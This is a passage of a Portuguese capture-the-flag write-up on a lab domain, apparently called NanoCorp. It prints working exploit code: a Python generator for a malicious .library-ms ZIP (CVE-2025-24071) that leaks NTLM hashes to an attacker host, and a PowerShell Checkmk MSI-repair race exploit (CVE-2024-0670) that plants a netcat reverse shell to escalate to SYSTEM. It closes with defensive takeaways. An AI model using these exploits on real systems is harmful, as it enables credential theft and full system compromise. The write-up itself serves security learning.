02 Foothold — CVE-2025-24071 — 0-click NTLM Hash Leak

A porta 80 expõe um painel de upload de arquivos .zip. Após leitura do blog de CTI (CVE-2025-24071: NTLM Hash Leak), a vulnerabilidade é explorada da seguinte forma:

  • Um arquivo .library-ms contém XML interno com a tag <url> apontando para um caminho UNC controlado pelo atacante.
  • Quando o ZIP é extraído — ou apenas aberto no Explorer — o Windows tenta pré-visualizar automaticamente o conteúdo do .library-ms.
  • Durante essa pré-visualização, o Explorer lê o XML e tenta acessar \\attacker-IP\share via SMB sem nenhuma interação do usuário.
  • Essa tentativa dispara automaticamente uma autenticação NTLM, enviando o hash da vítima ao servidor do atacante.

Exploit utilizado: github.com/0x6rss/CVE-2025-24071_PoC

exploit.py — geração do .library-ms malicioso
import os, zipfile

def main():
    file_name  = input("Enter your file name: ")
    ip_address = input("Enter IP (EX: 192.168.1.162): ")

    library_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\{ip_address}\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>"""

    lib_file = f"{file_name}.library-ms"
    with open(lib_file, "w", encoding="utf-8") as f:
        f.write(library_content)
    with zipfile.ZipFile("exploit.zip", "w", zipfile.ZIP_DEFLATED) as z:
        z.write(lib_file)
    os.remove(lib_file)
    print("completed")

07 Privilege Escalation — CVE-2024-0670 (Checkmk MSI Repair)

Em C:\Windows\Temp existe o binário RunasCs.exe, que permite executar processos como outro usuário com suas permissões. O agente Checkmk (mk) corre como SYSTEM e é vulnerável a uma race condition no caminho de repair do MSI.

O exploit (fuck.ps1) realiza três etapas:

  • Localiza o MSI do Checkmk via registro: HKLM:\SOFTWARE\...\DisplayName -like '*mk*'
  • Semeia arquivos .cmd read-only em C:\Windows\Temp\ com o payload de reverse shell para nc.exe
  • Dispara o repair: msiexec.exe /fa [msi_path] /qn
fuck.ps1 — Checkmk MSI race condition exploit
param(
    [int]$MinPID  = 1000,
    [int]$MaxPID  = 15000,
    [string]$LHOST = "10.10.16.224",
    [string]$LPORT = "4444"
)

# 1. Payload de reverse shell
$NcPath      = "C:\Windows\Temp\nc"
$BatchPayload = "@echo off`r`n$NcPath -e cmd.exe $LHOST $LPORT"

# 2. Localiza MSI do Checkmk
$msi = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties' |
        Where-Object { $_.DisplayName -like '*mk*' } |
        Select-Object -First 1).LocalPackage

# 3. Semeia arquivos .cmd read-only
foreach ($ctr in 0..1) {
    for ($num = $MinPID; $num -le $MaxPID; $num++) {
        $filePath = "C:\Windows\Temp\cmk_all_$($num)_$($ctr).cmd"
        [System.IO.File]::WriteAllText($filePath, $BatchPayload, [System.Text.Encoding]::ASCII)
        Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true
    }
}

# 4. Dispara o MSI repair
Start-Process "msiexec.exe" -ArgumentList "/fa `"$msi`" /qn /l*vx C:\Windows\Temp\cmk_repair.log" -Wait

08 Key Takeaways
▸ CVE-2025-24071 é um vetor de coerção NTLM 0-click. Qualquer plataforma que processa ZIPs contendo .library-ms é potencialmente vulnerável — sem interação do usuário. Patching e bloqueio de autenticação NTLM outbound são as mitigações principais.
▸ DACL misconfigurations são invisíveis para a maioria dos defensores, mas trivialmente exploráveis com BloodHound. Permissões como AddSelf e ForceChangePassword devem ser auditadas regularmente em ambientes AD.
▸ WinRM sobre HTTPS na porta 5986 quebra o tooling padrão (evil-winrm assume 5985/HTTP). Sempre verificar serviços SSL durante a enumeração — o certificado revela o hostname real do DC.
▸ CVE-2024-0670 demonstra o perigo de agentes de monitoramento rodando como SYSTEM. Race conditions em caminhos de repair de MSI são um vetor de LPE clássico e frequentemente ignorado em hardening.
▸ NanoCorp ilustra como uma cadeia de misconfigs individualmente "baixo risco" pode levar a comprometimento total do domínio — espelhando caminhos de ataque de APTs reais documentados no MITRE ATT&CK.
